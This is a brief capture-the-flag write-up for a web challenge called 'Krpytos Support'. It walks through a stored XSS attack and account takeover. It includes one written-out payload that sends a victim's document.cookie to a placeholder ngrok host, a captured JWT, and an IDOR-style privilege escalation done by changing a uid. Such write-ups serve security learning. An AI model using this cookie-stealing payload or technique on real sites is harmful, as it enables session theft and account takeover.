<h2>Krpytos Support</h2>

<blockquote>
  <p>Solved By : thewhiteh4t</p>
</blockquote>

<p>In this one we land on a support page where we can send a POST request, it also contains a backend button which takes us to a login page…</p>

<p>first I thought its a cookie stealing challenge so I send the following payload : </p>

<p><code>html
&lt;img src=x onerror=this.src='&lt;NGROK-LINK-HERE&gt;/?'+document.cookie;&gt;
</code></p>

<p>and I got a JWT : </p>

<p><code>
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI
</code></p>

<p>decoded :</p>

<p><code>
{
  "username": "moderator",
  "uid": 100,
  "iat": 1652534885
}
</code></p>

<p>and I got two interesting things here, now the cookie did not work for login for some reason so I went back to enum and found an API endpoint :</p>

<p><code>
/api/users/update
</code></p>

<p>using XHR I sent the following request to change the password :</p>

<p><img src="https://i.imgur.com/mVy9Zs9.png" alt="" /></p>

<p>logged in with the new password :</p>

<p><img src="https://i.imgur.com/lkqwQPZ.png" alt="" /></p>

<p>but moderator doesn’t have the flag so I had to escalate to admin…</p>

<p>using the same payload above I just changed the <code>uid</code> from 100 to 1 and logged in again, I could have got it one go but well… </p>

<p><img src="https://i.imgur.com/JI1lO3O.png" alt="" /></p>
